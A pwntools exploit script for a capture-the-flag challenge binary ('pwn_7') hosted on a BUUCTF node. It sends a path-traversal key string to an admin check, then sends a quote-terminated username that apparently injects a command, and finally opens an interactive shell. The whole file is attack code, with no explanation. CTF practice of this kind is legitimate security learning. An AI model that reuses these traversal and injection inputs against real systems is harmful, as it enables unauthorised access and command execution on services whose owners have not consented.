#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch = 'amd64', os = 'linux')
context.log_level = 'debug'
context.terminal='wt.exe bash -c'.split(' ')

REMOTE = True
ip = 'node4.buuoj.cn'
port = 28782
if REMOTE:
    sh = remote(ip, port)
else:
    sh = process('./pwn_7')
elf = ELF('./pwn_7')
# libc = ELF('./')

def menu(choice: int):
    sh.recvuntil(b'Your choice >> ')
    sh.sendline(str(choice))

def check(key: bytes):
    menu(1)
    sh.recvuntil(b'Please input the key of admin : ')
    sh.send(key)

def add(cmd: bytes):
    menu(2)
    sh.recvuntil(b'Please input the username to add : ')
    sh.send(cmd)

print(len('.././././././././././keys'))
check(b".././././././././././keysh\n\n")
# gdb.attach(sh, 'b *$rebase(0x1495)\nb *$rebase(0x16EF)\nb *$rebase(0x1748)\nset follow-fork-mode parent')
# pause(3)
add( b"AAAAAA'\n")
sh.interactive()